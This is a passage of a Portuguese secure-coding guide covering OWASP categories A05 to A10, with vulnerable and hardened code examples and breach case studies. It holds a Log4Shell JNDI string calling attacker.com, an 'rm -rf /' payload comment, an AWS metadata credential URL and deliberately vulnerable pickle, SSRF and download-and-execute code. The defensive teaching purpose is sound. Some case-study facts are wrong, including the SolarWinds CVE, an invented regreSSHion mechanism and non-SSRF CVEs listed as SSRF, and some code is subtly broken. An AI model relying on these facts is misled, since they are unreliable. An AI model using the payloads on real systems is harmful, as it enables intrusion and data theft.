app.get('/api/data', (req, res) => {
    res.json({ data: 'sensitive information' });
});

// Seguro: Headers de seguranca
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

app.use(helmet());
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
    }
}));

app.use(helmet.hsts({
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
}));

app.use(helmet.referrerPolicy({
    policy: 'no-referrer'
}));

app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    standardHeaders: true,
    legacyHeaders: false,
}));
```

### Nginx — Configuração Segura

```nginx
# VULNERAVEL: Configuracao Nginx padrao
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;
}

# Seguro: Configuracao Nginx hardening
server {
    listen 443 ssl http2;
    server_name example.com;

    # TLS Configuration
    ssl_certificate /etc/ssl/certs/server.crt;
    ssl_certificate_key /etc/ssl/private/server.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    ssl_session_tickets off;

    # Security Headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "no-referrer" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;

    # Disable server tokens
    server_tokens off;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

    root /var/www/html;
    index index.html;

    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://backend;
    }

    # Block common attack patterns
    location ~* \.(php|asp|aspx|jsp)$ {
        return 444;
    }

    # Deny access to hidden files
    location ~ /\. {
        deny all;
    }
}

server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

### Caso de Estudo — Equifax Breach (2017)

**Data**: Setembro de 2017
**CVE**: CVE-2017-5638 (Apache Struts)
**Impacto**: 147 milhões de pessoas afetadas
**Causa Raiz**: Misconfiguration + componente desatualizado

O Apache Struts tinha uma vulnerabilidade que permitia remote code execution. A Equifax não aplicou o patch disponível havia meses, e o sistema de monitoramento não detectou a exploração. O resultado foi um dos maiores vazamentos de dados da história.

---

## A06: Vulnerable and Outdated Components

### Descrição

Vulnerable and Outdated Components é uma das categorias mais prevalentes (8.77%), mas também uma das mais negligenciadas. Muitas equipes não mantêm inventário atualizado de dependências.

### CVE-2021-44228 — Log4Shell

Log4Shell é uma das vulnerabilidades mais devastadoras já descobertas. Afeta o Apache Log4j2, uma biblioteca de logging usada em milhões de aplicações Java.

**CVE**: CVE-2021-44228
**CVSS**: 10.0 (Crítico)
**Mecanismo**: JNDI Injection via log message

**Como Funciona**:
O Log4j2 permite que mensagens de log contenham lookup patterns. Um atacante pode enviar uma mensagem como:

```
${jndi:ldap://attacker.com/malicious}
```

Quando essa mensagem é logada, o Log4j2 resolve o lookup via JNDI, que faz uma requisição ao servidor LDAP do atacante. O servidor retorna um objeto Java malicioso que é carregado e executado no contexto do servidor.

### Ciclo de Vida de Dependências

```
[ Descoberta ] --> [ Avaliacao ] --> [ Correcao ] --> [ Teste ] --> [ Deploy ]
       ^                                                          |
       |                                                          v
       +----------------------------------------------------------+
                         (monitoramento continuo)
```

### Exemplos em Código

#### Gerenciamento de Dependências Node.js

```json
// package.json - VULNERAVEL: Versoes especificas fixas
{
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.19",
    "axios": "0.21.1"
  }
}
```

```json
// package.json - SEGURO: Versoes com range + package-lock.json
{
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "axios": "^1.6.0"
  },
  "devDependencies": {
    "audit-ci": "^6.0.0"
  },
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:ci": "audit-ci --moderate"
  }
}
```

#### Python — Gerenciamento de Dependências

```python
# VULNERAVEL: requirements.txt com versoes fixas antigas
"""
flask==2.0.0
requests==2.25.0
sqlalchemy==1.4.0
"""

# SEGUIO: requirements.txt com versoes atualizadas
"""
flask>=2.3.2,<3.0.0
requests>=2.31.0,<3.0.0
sqlalchemy>=2.0.0,<3.0.0
cryptography>=41.0.0,<42.0.0
"""

# requirements-dev.txt
"""
bandit>=1.7.0
safety>=2.3.0
pip-audit>=2.6.0
"""
```

```bash
# Scripts de verificacao de seguranca
#!/bin/bash
# security-audit.sh

echo "=== Python Security Audit ==="

# Verificar vulnerabilidades conhecidas
echo "--- Checking with safety ---"
pip install safety
safety check -r requirements.txt

echo "--- Checking with pip-audit ---"
pip install pip-audit
pip-audit -r requirements.txt

# Verificar imports perigosos
echo "--- Checking with bandit ---"
bandit -r src/ -ll -f json -o bandit-report.json

echo "=== Audit Complete ==="
```

#### CI/CD Pipeline — Verificação Automatizada

```yaml
# .github/workflows/security-audit.yml
name: Security Audit

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Toda segunda-feira as 6h

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit
        run: npm audit --audit-level=high

      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  sast-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/security-audit

      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v2
        with:
          languages: javascript, python
```

### Padrões de Prevenção

1. **Software Composition Analysis (SCA)**: Use ferramentas como Snyk, OWASP Dependency-Check
2. **SBOM**: Mantenha Software Bill of Materials atualizado
3. **Automated Updates**: Configure Dependabot, Renovate ou Renovate Bot
4. **Vulnerability Scanning**: Execute varreduras regulares
5. **Dependency Pinning**: Use lock files para garantir builds reproduzíveis
6. **Risk Assessment**: Avalie o risco de cada dependência antes de adicionar

### Caso de Estudo CVE-2021-44228 (Log4Shell)

**Data**: 9 de dezembro de 2021
**Vulnerabilidade**: JNDI Injection no Apache Log4j2
**CVSS**: 10.0 (Crítico)
**Impacto**: Afetou milhões de servidores, incluindo Apple, Amazon, Twitter, Minecraft

**Timeline**:
1. Vulnerabilidade descoberta e reportada ao Apache
2. Apache lança versão corrigida (2.15.0)
3. Milhares de empresas correm para aplicar patches
4. Atacantes começam a explorar massivamente
5. Ferramentas de exploração se tornam públicas
6. Patching generalizado, mas muitos sistemas permanecem vulneráveis por meses

**Lição**: Uma dependência de logging — algo que parecia inofensivo — causou uma das maiores crises de segurança da história. Nunca subestime o impacto potencial de qualquer dependência.

---

## A07: Authentication Failures

### Descrição

Authentication Failures engloba vulnerabilidades relacionadas à verificação de identidade. Inclui brute force, credential stuffing, ataques de sessão, e falhas na implementação de autenticação.

### CVE-2024-6387 — regreSSHion

**CVE**: CVE-2024-6387
**CVSS**: 8.1 (Alto)
**Vulnerabilidade**: Race condition no OpenSSH que permite remote code execution

**Mecanismo**: Quando o login com PreferAuthChoices está habilitado e um atacante envia tentativas de autenticação com timeout, uma race condition pode ser explorada para executar código arbitrário como root.

### Tipos de Ataques

#### Brute Force

```python
# VULNERAVEL: Login sem rate limiting
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    user = User.query.filter_by(username=username).first()
    if user and check_password(user.password_hash, password):
        token = create_jwt(user)
        return jsonify({"token": token})

    return jsonify({"error": "Invalid credentials"}), 401

# Seguro: Rate limiting + account lockout + MFA
import redis
from datetime import datetime, timedelta

redis_client = redis.Redis(host='localhost', port=6379, db=0)

class LoginProtection:
    MAX_ATTEMPTS = 5
    LOCKOUT_DURATION = timedelta(minutes=15)
    RATE_LIMIT_WINDOW = timedelta(minutes=1)

    def __init__(self, user_id, ip_address):
        self.user_id = user_id
        self.ip_address = ip_address
        self.attempt_key = f"login:attempts:{user_id}:{ip_address}"
        self.lockout_key = f"login:lockout:{user_id}"

    def is_locked_out(self):
        return redis_client.exists(self.lockout_key)

    def record_attempt(self, success):
        if success:
            redis_client.delete(self.attempt_key)
            redis_client.delete(self.lockout_key)
            return

        pipe = redis_client.pipeline()
        pipe.incr(self.attempt_key)
        pipe.expire(self.attempt_key, int(self.RATE_LIMIT_WINDOW.total_seconds()))
        attempts = pipe.execute()[0]

        if attempts >= self.MAX_ATTEMPTS:
            redis_client.setex(
                self.lockout_key,
                int(self.LOCKOUT_DURATION.total_seconds()),
                "locked"
            )
            self.notify_security_team()

    def notify_security_team(self):
        logger.warning(
            f"Account {self.user_id} locked out from IP {self.ip_address}"
        )

@app.route('/api/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    ip_address = request.remote_addr

    user = User.query.filter_by(username=username).first()

    if user:
        protection = LoginProtection(user.id, ip_address)

        if protection.is_locked_out():
            return jsonify({"error": "Account temporarily locked"}), 423

        if check_password(user.password_hash, password):
            protection.record_attempt(True)

            if not user.mfa_enabled:
                return jsonify({
                    "warning": "MFA not enabled",
                    "token": create_jwt(user)
                })

            mfa_token = create_mfa_token(user)
            return jsonify({"mfa_required": True, "mfa_token": mfa_token})
        else:
            protection.record_attempt(False)

    # Sempre retorna a mesma mensagem (não revelar se o usuário existe)
    return jsonify({"error": "Invalid credentials"}), 401
```

#### Credential Stuffing

```javascript
// VULNERAVEL: Sistema sem verificacao de credenciais comprometidas
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username });

    if (user && await bcrypt.compare(password, user.passwordHash)) {
        const token = generateToken(user);
        return res.json({ token });
    }

    res.status(401).json({ error: 'Invalid credentials' });
});

// Seguro: Verificacao de credenciais comprometidas
const crypto = require('crypto');
const { HIBP_API_KEY } = require('./config');

async function checkPasswordPwned(password) {
    const sha1 = crypto.createHash('sha1')
        .update(password)
        .digest('hex')
        .toUpperCase();

    const prefix = sha1.slice(0, 5);
    const suffix = sha1.slice(5);

    const response = await fetch(
        `https://api.pwnedpasswords.com/range/${prefix}`,
        { headers: { 'Add-Padding': 'true' } }
    );

    const text = await response.text();
    const hashes = text.split('\n');

    for (const hash of hashes) {
        const [hashSuffix, count] = hash.split(':');
        if (hashSuffix.trim() === suffix) {
            return parseInt(count, 10);
        }
    }

    return 0;
}

app.post('/api/register', async (req, res) => {
    const { username, password, email } = req.body;

    const pwnedCount = await checkPasswordPwned(password);
    if (pwnedCount > 0) {
        return res.status(400).json({
            error: 'This password has been found in a data breach',
            count: pwnedCount
        });
    }

    const passwordHash = await bcrypt.hash(password, 12);
    const user = await User.create({ username, email, passwordHash });

    res.status(201).json({ message: 'User created successfully' });
});

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username });

    if (user && await bcrypt.compare(password, user.passwordHash)) {
        // Verificar periodicamente se a senha foi comprometida
        const pwnedCount = await checkPasswordPwned(password);
        if (pwnedCount > 0) {
            user.passwordCompromised = true;
            await user.save();
        }

        const token = generateToken(user);
        return res.json({ token });
    }

    res.status(401).json({ error: 'Invalid credentials' });
});
```

#### Session Hijacking

```python
# VULNERAVEL: Sessao sem protecoes
@app.route('/api/login', methods=['POST'])
def login():
    user = authenticate(request.json)
    session['user_id'] = user.id
    return jsonify({"message": "Logged in"})

# Seguro: Sessao com protecoes completas
from flask import session
from datetime import datetime, timedelta
import secrets

@app.route('/api/login', methods=['POST'])
def login():
    user = authenticate(request.json)
    if not user:
        return jsonify({"error": "Invalid credentials"}), 401

    # Invalidar sessoes anteriores
    invalidate_user_sessions(user.id)

    # Criar nova sessao com token seguro
    session_token = secrets.token_urlsafe(32)
    session_id = create_session(user.id, session_token, request)

    # Configurar cookie seguro
    response = jsonify({"message": "Logged in"})
    response.set_cookie(
        'session_id',
        session_id,
        httponly=True,
        secure=True,
        samesite='Strict',
        max_age=3600
    )

    return response

@app.route('/api/logout', methods=['POST'])
def logout():
    session_id = request.cookies.get('session_id')
    if session_id:
        invalidate_session(session_id)

    response = jsonify({"message": "Logged out"})
    response.delete_cookie('session_id')
    return response
```

### Padrões de Prevenção

1. **Multi-Factor Authentication (MFA)**: Implemente MFA para todas as contas
2. **Rate Limiting**: Limite tentativas de login por IP e por conta
3. **Password Policies**: Use políticas de senha modernas (NIST 800-63B)
4. **Password Hashing**: Use Argon2id ou bcrypt com work factor adequado
5. **Session Management**: Tokens de sessão seguros com expiração
6. **Account Lockout**: Bloqueio temporário após tentativas falhas
7. **Breach Detection**: Verifique senhas comprometidas (HIBP API)

### Caso de Estudo CVE-2024-6387 (regreSSHion)

**Data**: 1 de julho de 2024
**Vulnerabilidade**: Race condition no login do OpenSSH
**CVSS**: 8.1 (Alto)
**Impacto**: Remote code execution como root

O bug existia desde 2020 (versão 8.5p1) e foi reintroduzido acidentalmente. Um atacante poderia explorar a race condition enviando tentativas de login específicas, obtendo acesso root sem autenticação.

---

## A08: Software and Data Integrity Failures

### Descrição

Software and Data Integrity Failures é uma categoria nova na edição 2021, combinando deserialização insegura com falhas de integridade de software e dados. Inclui ataques à cadeia de suprimentos (supply chain), CI/CD pipelines inseguras, e deserialização insegura.

### Supply Chain Attacks

#### CVE-2020-14001 — SolarWinds

**Data**: Dezembro de 2020
**Impacto**: Mais de 18.000 organizações afetadas, incluindo agências governamentais dos EUA
**Mecanismo**: Comprometimento da cadeia de suprimentos de software

Os atacantes comprometeram o processo de build do SolarWinds Orion, injetando backdoor no software antes da compilação. Quando os clientes instalavam atualizações legítimas, o malware (SUNBURST) era instalado junto.

**Lição**: A integridade do software não é apenas sobre checksums — é sobre todo o pipeline de build e distribuição.

#### CVE-2024-3094 — XZ Utils Backdoor

**Data**: Março de 2024
**Impacto**: Backdoor em biblioteca compressão usada por virtually toda distribuição Linux
**Mecanismo**: Comprometimento gradual do processo de manutenção

Um contribuidor aparentemente confiável ganhou confiança ao longo de 2 anos, depois injetou código malicioso que permitia remote code execution em servidores SSH.

### Exemplos em Código

#### CI/CD Pipeline Seguro

```yaml
# .github/workflows/secure-build.yml
name: Secure Build Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: Verify commit signature
        run: |
          git log --format='%H %G?' -1 | while read hash sig; do
            if [ "$sig" != "G" ]; then
              echo "ERROR: Commit $hash is not signed"
              exit 1
            fi
          done

      - name: Run SAST
        uses: github/codeql-action/analyze@v2
        with:
          languages: javascript

      - name: Run dependency check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          path: '.'
          format: 'HTML'

  build:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build with checksums
        run: |
          npm ci
          npm run build
          sha256sum dist/* > dist/SHA256SUMS

      - name: Sign build artifacts
        run: |
          gpg --batch --import "${{ secrets.BUILD_KEY }}"
          for file in dist/*; do
            gpg --batch --yes --detach-sign "$file"
          done

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-${{ github.sha }}
          path: dist/
```

#### Deserialização Insegura

```python
# VULNERAVEL: Pickle deserialization
import pickle
import base64

def load_user_data(data):
    decoded = base64.b64decode(data)
    return pickle.loads(decoded)  # CRITICO: executa codigo arbitrario

# Um atacante pode enviar:
# import os; os.system('rm -rf /')

# Seguro: Usar JSON para serializacao
import json

def load_user_data(data):
    return json.loads(data)

# Para serializacao complexa, usar safe serialization
import json
from datetime import datetime

class SafeEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime):
            return {'__type__': 'datetime', 'value': obj.isoformat()}
        return super().default(obj)

def safe_serialize(data):
    return json.dumps(data, cls=SafeEncoder)

def safe_deserialize(data):
    return json.loads(data, object_hook=object_hook)

def object_hook(obj):
    if '__type__' in obj:
        if obj['__type__'] == 'datetime':
            return datetime.fromisoformat(obj['value'])
    return obj
```

#### Integrity Verification

```javascript
// VULNERAVEL: Baixar e executar sem verificacao
const https = require('https');
const { execSync } = require('child_process');

function downloadAndInstall(url) {
    https.get(url, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            require('fs').writeFileSync('/tmp/installer.sh', data);
            execSync('bash /tmp/installer.sh');
        });
    });
}

// Seguro: Verificacao de integridade
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class IntegrityVerifier {
    constructor(trustedHashes) {
        this.trustedHashes = trustedHashes;
    }

    async verifyFile(filePath, expectedHash) {
        const fileBuffer = fs.readFileSync(filePath);
        const hash = crypto.createHash('sha256')
            .update(fileBuffer)
            .digest('hex');

        return hash === expectedHash;
    }

    async verifyAndInstall(url, expectedHash, installPath) {
        const tempPath = path.join('/tmp', `installer-${Date.now()}`);

        await this.downloadFile(url, tempPath);

        const isValid = await this.verifyFile(tempPath, expectedHash);
        if (!isValid) {
            fs.unlinkSync(tempPath);
            throw new Error('Integrity check failed');
        }

        fs.copyFileSync(tempPath, installPath);
        fs.chmodSync(installPath, 0o755);
        fs.unlinkSync(tempPath);

        return true;
    }
}

const verifier = new IntegrityVerifier();
await verifier.verifyAndInstall(
    'https://example.com/installer.sh',
    'a1b2c3d4e5f6...',
    '/usr/local/bin/installer'
);
```

### Padrões de Prevenção

1. **Digital Signatures**: Assine todos os artefatos de build
2. **SLSA Framework**: Implemente Supply-chain Levels for Software Artifacts
3. **Reproducible Builds**: Builds devem ser reproduzíveis e verificáveis
4. **Dependency Review**: Revise dependências antes de adicionar
5. **SBOM**: Mantenha Software Bill of Materials
6. **No Unsafe Deserialization**: Nunca deserialize dados não confiáveis
7. **Integrity Checks**: Verifique checksums e assinaturas de artefatos

---

## A09: Security Logging and Monitoring Failures

### Descrição

Security Logging and Monitoring Failures é uma das categorias mais prevalentes (6.51%), mas frequentemente negligenciada. Sem logs adequados e monitoramento, é impossível detectar, prevenir ou investigar ataques.

### Importância dos Logs

```
[Ataque] --> [Deteccao] --> [Resposta] --> [Recuperacao]
              ^                ^               ^
              |                |               |
           Logging        Monitoring       Forensics
```

Sem logging, nenhum desses estágios é possível.

### Exemplos em Código

#### Logging Centralizado

```python
# VULNERAVEL: Logging inadequado
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/api/login', methods=['POST'])
def login():
    user = authenticate(request.json)
    if user:
        return jsonify({"token": create_jwt(user)})
    return jsonify({"error": "Invalid credentials"}), 401

# Seguro: Logging estruturado e seguro
import structlog
from pythonjsonlogger import jsonlogger

# Configurar logging estruturado
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.add_log_level,
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.PrintLoggerFactory()
)

logger = structlog.get_logger()

@app.route('/api/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    username = request.json.get('username', 'unknown')
    ip_address = request.remote_addr

    user = authenticate(request.json)
    if user:
        logger.info(
            "login_success",
            user_id=user.id,
            username=username,
            ip_address=ip_address,
            user_agent=request.user_agent.string
        )
        return jsonify({"token": create_jwt(user)})

    logger.warning(
        "login_failed",
        username=username,
        ip_address=ip_address,
        user_agent=request.user_agent.string
    )
    return jsonify({"error": "Invalid credentials"}), 401

@app.route('/api/data', methods=['GET'])
def get_data():
    user = get_current_user()
    logger.info(
        "data_access",
        user_id=user.id,
        endpoint=request.path,
        method=request.method,
        ip_address=request.remote_addr
    )
    return jsonify(get_user_data(user.id))
```

#### Security Event Monitoring

```python
# Monitor de eventos de seguranca
from datetime import datetime, timedelta
from collections import defaultdict
import threading

class SecurityMonitor:
    def __init__(self):
        self.events = defaultdict(list)
        self.lock = threading.Lock()
        self.alert_thresholds = {
            'failed_logins': {'count': 5, 'window': timedelta(minutes=5)},
            'privilege_escalation': {'count': 1, 'window': timedelta(minutes=1)},
            'data_export': {'count': 3, 'window': timedelta(minutes=10)},
        }

    def record_event(self, event_type, user_id, ip_address, details=None):
        with self.lock:
            event = {
                'timestamp': datetime.utcnow(),
                'user_id': user_id,
                'ip_address': ip_address,
                'details': details or {}
            }
            self.events[event_type].append(event)

            self._check_thresholds(event_type, user_id, ip_address)

    def _check_thresholds(self, event_type, user_id, ip_address):
        if event_type not in self.alert_thresholds:
            return

        threshold = self.alert_thresholds[event_type]
        cutoff = datetime.utcnow() - threshold['window']

        recent_events = [
            e for e in self.events[event_type]
            if e['timestamp'] > cutoff and e['user_id'] == user_id
        ]

        if len(recent_events) >= threshold['count']:
            self._trigger_alert(event_type, user_id, ip_address, recent_events)

    def _trigger_alert(self, event_type, user_id, ip_address, events):
        alert = {
            'type': 'SECURITY_ALERT',
            'event_type': event_type,
            'user_id': user_id,
            'ip_address': ip_address,
            'event_count': len(events),
            'timestamp': datetime.utcnow().isoformat(),
            'severity': 'HIGH'
        }

        logger.critical("security_alert", **alert)
        send_alert_to_siem(alert)

        # Acoes automaticas
        if event_type == 'failed_logins' and len(events) >= 10:
            lock_account(user_id)
            block_ip(ip_address, duration=timedelta(hours=1))

monitor = SecurityMonitor()

@app.route('/api/login', methods=['POST'])
def login():
    user = authenticate(request.json)
    if user:
        monitor.record_event('login_success', user.id, request.remote_addr)
        return jsonify({"token": create_jwt(user)})

    monitor.record_event(
        'failed_logins',
        request.json.get('username', 'unknown'),
        request.remote_addr,
        {'reason': 'invalid_credentials'}
    )
    return jsonify({"error": "Invalid credentials"}), 401
```

#### Audit Trail

```python
# Sistema de audit trail
from sqlalchemy import event
from sqlalchemy.orm.attributes import get_history

class AuditMixin:
    """Mixin para auditar alteracoes em modelos SQLAlchemy"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._changes = {}

    def audit_changes(self):
        if not self._changes:
            return

        audit_entry = AuditLog(
            table_name=self.__tablename__,
            record_id=self.id,
            action='UPDATE',
            old_values=self._changes.get('old', {}),
            new_values=self._changes.get('new', {}),
            user_id=get_current_user_id(),
            timestamp=datetime.utcnow()
        )
        db.session.add(audit_entry)
        db.session.commit()
        self._changes = {}

# Hook para capturar alteracoes
@event.listens_for(db.session, 'before_flush')
def capture_changes(session, flush_context, instances):
    for obj in session.dirty:
        if hasattr(obj, 'audit_changes'):
            history = {}
            for attr in obj.__table__.columns:
                old_val, new_val, = get_history(obj, attr.name)
                if old_val != new_val:
                    history[attr.name] = {'old': old_val, 'new': new_val}

            if history:
                obj._changes = history
                obj.audit_changes()
```

### Padrões de Prevenção

1. **Structured Logging**: Use JSON format para logs estruturados
2. **Centralized Logging**: Centralize logs em SIEM (Splunk, ELK, Datadog)
3. **Security Events**: Log eventos de segurança (login, acesso, alterações)
4. **Alerting**: Configure alertas para padrões suspeitos
5. **Retention**: Mantenha logs por pelo menos 90 dias
6. **Immutability**: Logs devem ser imutáveis (append-only)
7. **Correlation IDs**: Use IDs de correlação para rastrear requisições

### Caso de Estudo — Target Breach (2013)

**Data**: Novembro de 2013
**Impacto**: 40 milhões de cartões de crédito comprometidos
**Causa Raiz**: Falha de monitoramento

O Target tinha um sistema de detecção de intrusões (FireEye) que detectou o malware. No entanto, os alertas foram ignorados pela equipe de segurança. O resultado foi um dos maiores ataques a varejo da história.

**Lição**: Ter logging e monitoramento não é suficiente — é necessário responder aos alertas.

---

## A10: Server-Side Request Forgery (SSRF)

### Descrição

Server-Side Request Forgery (SSRF) é uma vulnerabilidade que permite que um atacante faça o servidor faça requisições para destinos arbitrários, incluindo serviços internos que não deveriam ser acessíveis.

### CVE-2019-9193 — PostgreSQL

**CVE**: CVE-2019-9193
**CVSS**: 9.8 (Crítico)
**Vulnerabilidade**: Permite que comandos COPY TO PROGRAM sejam executados remotamente

Embora seja uma vulnerabilidade de banco de dados, demonstra o princípio do SSRF: forçar um servidor a executar operações que não deveriam ser acessíveis remotamente.

### CVE-2019-11932 — WhatsApp

**CVE**: CVE-2019-11932
**Impacto**: Memory corruption que poderia ser explorada via SSRF

### Exemplos em Código

```python
# VULNERAVEL: SSRF simples
import requests

@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text

# Atacante pode acessar:
# http://localhost:8080/admin
# http://169.254.169.254/latest/meta-data/ (AWS metadata)
# http://internal-service/api/secrets

# Seguro: Validacao e whitelist de URLs
from urllib.parse import urlparse
import ipaddress
import socket

class URLValidator:
    ALLOWED_SCHEMES = {'https'}
    BLOCKED_HOSTS = {'localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'}
    BLOCKED_NETWORKS = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('169.254.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
    ]

    @classmethod
    def validate_url(cls, url):
        parsed = urlparse(url)

        if parsed.scheme not in cls.ALLOWED_SCHEMES:
            raise ValueError(f"Scheme {parsed.scheme} not allowed")

        if parsed.hostname in cls.BLOCKED_HOSTS:
            raise ValueError(f"Host {parsed.hostname} is blocked")

        try:
            ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
            for network in cls.BLOCKED_NETWORKS:
                if ip in network:
                    raise ValueError(f"IP {ip} is in blocked network")
        except socket.gaierror:
            raise ValueError("Cannot resolve hostname")

        return True

@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    try:
        URLValidator.validate_url(url)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    # Usar timeout e limitar tamanho da resposta
    response = requests.get(url, timeout=5, stream=True)
    content = response.iter_content(chunk_size=1024)
    return Response(
        stream_with_context(content),
        content_type=response.headers.get('Content-Type')
    )
```

```javascript
// VULNERAVEL: SSRF via webhook
const express = require('express');
const axios = require('axios');

app.post('/api/webhook', async (req, res) => {
    const { callbackUrl, data } = req.body;

    try {
        const response = await axios.post(callbackUrl, data);
        res.json({ success: true, response: response.data });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Seguro: Validacao de URL com DNS rebinding protection
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

class SSRFProtection {
    static BLOCKED_RANGES = [
        { start: '10.0.0.0', end: '10.255.255.255' },
        { start: '172.16.0.0', end: '172.31.255.255' },
        { start: '192.168.0.0', end: '192.168.255.255' },
        { start: '127.0.0.0', end: '127.255.255.255' },
        { start: '169.254.0.0', end: '169.254.255.255' },
    ];

    static async validateUrl(urlString) {
        const parsed = new URL(urlString);

        if (!['http:', 'https:'].includes(parsed.protocol)) {
            throw new Error('Only HTTP/HTTPS protocols allowed');
        }

        const hostname = parsed.hostname;
        if (['localhost', '127.0.0.1', '0.0.0.0'].includes(hostname)) {
            throw new Error('Internal hosts not allowed');
        }

        const addresses = await dns.resolve4(hostname);
        for (const addr of addresses) {
            if (this.isPrivateIP(addr)) {
                throw new Error('URL resolves to private network');
            }
        }

        return true;
    }

    static isPrivateIP(ip) {
        const parts = ip.split('.').map(Number);
        const ipNum = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3];

        for (const range of this.BLOCKED_RANGES) {
            const startParts = range.start.split('.').map(Number);
            const endParts = range.end.split('.').map(Number);
            const startNum = (startParts[0] << 24) + (startParts[1] << 16) + (startParts[2] << 8) + startParts[3];
            const endNum = (endParts[0] << 24) + (endParts[1] << 16) + (endParts[2] << 8) + endParts[3];

            if (ipNum >= startNum && ipNum <= endNum) {
                return true;
            }
        }
        return false;
    }
}

app.post('/api/webhook', async (req, res) => {
    const { callbackUrl, data } = req.body;

    try {
        await SSRFProtection.validateUrl(callbackUrl);
    } catch (error) {
        return res.status(400).json({ error: error.message });
    }

    try {
        const response = await axios.post(callbackUrl, data, {
            timeout: 5000,
            maxRedirects: 3,
            maxContentLength: 1024 * 1024
        });
        res.json({ success: true, response: response.data });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
```

### AWS Metadata SSRF

```python
# VULNERAVEL: SSRF que permite acesso ao metadata da AWS
import requests

@app.route('/api/proxy')
def proxy():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text

# Atacante envia: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Retorna: credenciais IAM do servidor

# Seguro: Bloquear acesso ao metadata endpoint
import ipaddress

METADATA_IP = ipaddress.ip_address('169.254.169.254')

def is_metadata_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        return ip == METADATA_IP
    except ValueError:
        return False

# Configurar IMDSv2 (AWS)
# Exige token para acessar metadata
# aws ec2 modify-instance-metadata-options \
#   --instance-id i-1234567890abcdef0 \
#   --http-tokens required \
#   --http-endpoint enabled
```

### Padrões de Prevenção

1. **URL Validation**: Valide URLs contra uma whitelist de destinos permitidos
2. **Network Segmentation**: Isole serviços internos em redes separadas
3. **DNS Resolution**: Verifique se o hostname resolve para um IP não-privado
